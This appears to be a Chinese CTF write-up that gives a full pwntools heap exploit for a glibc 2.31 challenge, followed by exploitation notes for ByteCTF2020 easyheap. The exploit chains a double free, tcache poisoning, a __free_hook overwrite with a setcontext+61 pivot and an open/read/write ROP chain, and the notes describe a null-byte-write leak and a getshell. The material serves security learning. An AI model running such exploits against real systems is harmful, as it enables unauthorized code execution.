
```python
# encoding=utf-8
from pwn import *
#from LibcSearcher import *
s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)
shell = lambda: io.interactive()
r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)
libc_path = "/lib/x86_64-linux-gnu/libc-2.31.so"
elf_path = "./gun"
libc = ELF(libc_path)
elf = ELF(elf_path)
#io = remote("node3.buuoj.cn",26000)
if sys.argv[1]=='1':
context(log_level = 'debug',terminal= '/bin/zsh', arch = 'amd64', os = 'linux')
elif sys.argv[1]=='0':
context(log_level = 'info',terminal= '/bin/zsh', arch = 'amd64', os = 'linux')
#io = process([elf_path],env={"LD_PRELOAD":libc_path})
cho=b'Action>' # choice提示语
siz=b'Bullet price: ' # size输入提示语
con=b'Bullet Name:' # content输入提示语
ind='' # index输入提示语
edi='' # edit输入提示语
def add(size,content='',c='3'):
sal(cho,c)
err = rl()
#success(err)
if(err==(b' wrong game command!\n')):
sal(cho,c)
sal(siz,str(size))
sal(con,content)
def add_0(size,content='',c='3'):
sal(cho,c)
sal(siz,str(size))
sal(con,content)
def free(index,c='1'):
sal(cho,c)
sal("Shoot time: ",str(index))
def load(index,c='2'):
sal(cho,c)
sal('Which one do you want to load?',str(index))
def exp():
global io
io = process([elf_path])
name='a'*0x18
sa("name:",name)
#shell()
add(0x440,'Large chunk(0x440)')
add_0(0x10,'defense chunk(0x10)')
load(0)
free(1)
add_0(0x10,'backback')
load(0)
free(1)
libc.address = u64(ru(b"\x7f")[-6:].ljust(8,b'\x00'))-1120-libc.sym['__malloc_hook']-0x10
success("libc:"+hex(libc.address))
add_0(0x68,'ScUpax0s')
add_0(0x68,'ScUpax0s')
load(0)
load(1)
free(2)
add_0(0x10,'p') # 拉回来，拿到残留指针
load(0)
free(1)
ru(b'Pwn! The ')
heap = u64(r(6).ljust(8,b'\x00'))-0x270
success("heap:"+hex(heap))
add_0(0x68,'ScUpax0s')
add_0(0x68,'ScUpax0s')
add_0(0x68,'ScUpax0s')
add_0(0x68,'ScUpax0s')
add_0(0x68,'ScUpax0s')
add_0(0x68,'ScUpax0s')
add_0(0x68,'ScUpax0s')
add_0(0x68,'ScUpax0s')
#
load(0)
load(2)
load(3)
load(4)
load(5)
load(6)
load(7)
load(8)
free(8)
# 至此，填满tcache
load(1)
free(2) # fastbin double free+overlap
free_hook = libc.sym['__free_hook']
success("free_hook:"+hex(free_hook))
# 把tcache的拉回来
setcontext = libc.sym['setcontext']+61
orw_addr = heap+0x100
#success("frame_addr:"+hex(frame_addr))
p = p64(0)*4+p64(setcontext)
#success("total len:"+len(p+str_frame[0x28:]))
frame_addr = heap+0x3d0
payload = flat(
0,
frame_addr,
p64(0)*2,
setcontext
)
ret = 0x0000000000025679 + libc.address
add_0(0x68,'A'*0x10) # heap+
add_0(0x68,flat(p64(0)*6,orw_addr,ret))
add_0(0x68,'C'*0x10)
add_0(0x68,'D'*0x10)
add_0(0x68,'E'*0x10)
add_0(0x68,'F'*0x10)
add_0(0x68,'J'*0x10)
add_0(0x68,p64(heap+0x90))
add_0(0x68,payload) # heap+0x3d0,#8
pop_rdi = 0x0000000000026b72+libc.address
pop_rsi = 0x0000000000027529+libc.address
pop_rdx_r12 = 0x000000000011c371+libc.address
syscall = 0x000000000002584d+libc.address
pop_rax = 0x000000000004a550+libc.address
flag_str_addr = heap+0x100+0xd8
flag_addr = heap+0x200 # 读入这里
orw=flat(
pop_rdi,
flag_str_addr,
pop_rsi,
0,
pop_rax,
2,
#syscall,
libc.sym['open'],
# open("./flag",0);
pop_rdi,
3,
pop_rsi,
flag_addr,
pop_rdx_r12,
0x100,
0,
pop_rax,
0,
libc.sym['read'],
# read(3,flag_addr,0x100)
pop_rdi,
1,
pop_rsi,
flag_addr,
pop_rdx_r12,
0x100,
0,
pop_rax,
1,
libc.sym['write'],
'./flag\x00'
# write(1,flag_addr,0x100)
)
success(hex(len(orw)))
# heap+0x2f0
add_0(0x68,payload)
#pause()
add_0(0x68,p64(heap+0x10)*8+p64(heap+0xf8)+p64(heap+0x10)*2+p64(heap+0x28)+p64(heap+0xf8)) # 劫持0x20位置的tcache_entry
add_0(0x18,'a'*0x18)
add_0(0xc8,'aaaaaaaaaaa')
add_0(0x98,p64(heap+0x100))
#pause()
load(0)
load(2)
load(3)
load(4)
load(5)
free(5)
add_0(0xe0,orw)
add_0(0x28,p64(free_hook))
add_0(0x38,'\x70')
# 0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
magic_gadget = libc.address+0x0000000000154930
success("magic:"+hex(magic_gadget))
#add_0(0x38,p64(heap+0x100)) # mallochook劫持到orw的地方
add_0(0x38,p64(magic_gadget))
success("orw:"+hex(heap+0x100))
# free(7)
load(8)
shell()
exp()
'''
0x0000000000026b72 : pop rdi ; ret
0x0000000000027529 : pop rsi ; ret
0x000000000011c1e1 : pop rdx ; pop r12 ; ret
0x000000000004a550 : pop rax ; ret
0x000000000002584d : syscall
'''
```

**比较重要的是使用了2.31下的这一条gadget配合`setcontext+61`做栈迁移：**

```
0x0000000000154930: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
```

用`ropper`找的：

```
ropper -f /root/glibc-all-in-one/libs/2.31/libc-2.31.so --search 'mov rdx'
```

大概过程如下：

[![DQ7UyV.png](upload/attach/202011/876323_4ZH3HVT8XWVC4Y8.jpg)](<mark class="encrypted">e27K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6U0K9s2u0Q4x3X3g2U0L8$3#2Q4x3V1k6A6i4K6u0r3c8q4p5%4g2i4W2h3i4K6t1&6</mark>

实际2.29也有类似的，有兴趣可以自行研究。

最终：

[![DQ7Bo4.png](upload/attach/202011/876323_JG2UHNGZCFPNSHP.jpg)](<mark class="encrypted">ff7K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6U0K9s2u0Q4x3X3g2U0L8$3#2Q4x3V1k6A6i4K6u0r3c8q4p5%4b7X3)9@1i4K6t1&6</mark>

# ByteCTF2020 两道菜单堆

比赛的时候事情有些多，没怎么好好看题，赛后把题目认真做做补一下。

## easyheap

### 题目概览

1. Glibc 2.31（至高版本）保护全开
2. 标准菜单堆，`new`、`delete`、`show`三个功能。![](https://bbs.kanxue.com/upload/attach/202011/876323_SEHAFMBRRYSU48S.jpg)
3. **在`new`函数中有一个几乎是任意位置的单空字节写** ![](https://bbs.kanxue.com/upload/attach/202011/876323_DYPCZARBSBWFJQS.jpg)
4. 最多同时存在8个`chunk`。并且`free`之后会被清掉。![](https://bbs.kanxue.com/upload/attach/202011/876323_NPUWZGAVH7H9FUH.jpg)
5. `show`以`%s`打出来。有00截断。![](https://bbs.kanxue.com/upload/attach/202011/876323_B7V8JGVH4TYVX97.jpg)

### 利用思路

#### 泄露堆地址

可以看到这里`malloc`之后会做一个`memset`做一个清空的操作，但是这个不同于`calloc`，**`memset`的`size`是我们输入的`size`，但是由于我们最小的申请到的单位是0x20，如果我们`add`的`size = 1`，那么他会返回0x20，这样子把`size`错开，先`free`再拉回来，他只清空了1个字节，那么剩下的指针就泄露出来了**。

这里有两个小细节：

- 如果`size`直接就是合法的话，那么`size_1 = size`，那么当运行到：![](https://bbs.kanxue.com/upload/attach/202011/876323_GG5HEEF2ZQ5BHC5.jpg)

  会被补上一个空字节，对`show`造成截断。所以这里要做的一个处理就是触发一次任意地址空字节写，把这个空字节写飞，保证他不会影响到后续的`printf`。

- 注意他这里使用的`for`循环读取。那么实际上有**两个可以造成读取结束的情况**。如果`size`合法时，我们输入的内容比`size`小（即触发了`\n`结束）的话：也会造成补一个空字节，影响到`printf`，所以我们要保证，这个循环是由`i = size`退出（即`size = len(Content)`）而不是提前碰到了换行符退出。![](https://bbs.kanxue.com/upload/attach/202011/876323_GHWN9PWM6FXV3HS.jpg)

当这两/三个地方绕过后，就能泄露出heap base了

#### 泄露libc

接下来的事情几乎都是堆风水的事情了。

思路就是利用单空字节写，不停的对于偏移0x300位置的`chunk`进行劫持（`overlap`），最终达到的目标是申请到`pthread_tcache_struct`。

这样就完成了一个在`size`被限制的情况下获得一个0x290大小的`chunk`。

接下来我们想多次利用`pthread_tcache_struct`，那么我的想法是，首先要劫持`pthread_tcache_struct`的`number`来填满`tcache`，保证`pthread_tcache_struct`可以被`free`到`unsortedbin`，接下来，我们劫持`pthread_tcache_struct`中的`tcache_entry`保证有多个`tcache_entry`都指向`pthread_tcache_struct`类似如下（由于可申请的`size`有限，所以我们只能最多劫持6个`tcache_entry`的指针）：

[![DQbUVU.png](https://bbs.kanxue.com/upload/attach/202011/876323_EATT9HB5P7DT4U7.jpg)](https://bbs.kanxue.com/elink@ad0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6A6L8h3N6U0K9s2u0Q4x3V1k6A6i4K6u0r3c8q4q4T1g2g2k6g2)

接下来把`tcache`扔到`ubin`里，此时在`table`中有两个`tache`，然后`free`进`ubin`，直接`show`出来就好。

#### getshell

打`free_hook`，还是老办法，由于`pthread_tcache_struct`里已经有了多个指向他本身的指针，那么我们直接在`tcache`里填上`'/bin/sh\x00'`，然后`free_hook` `getshell`。

### exp

|  |  |
| --- | --- |
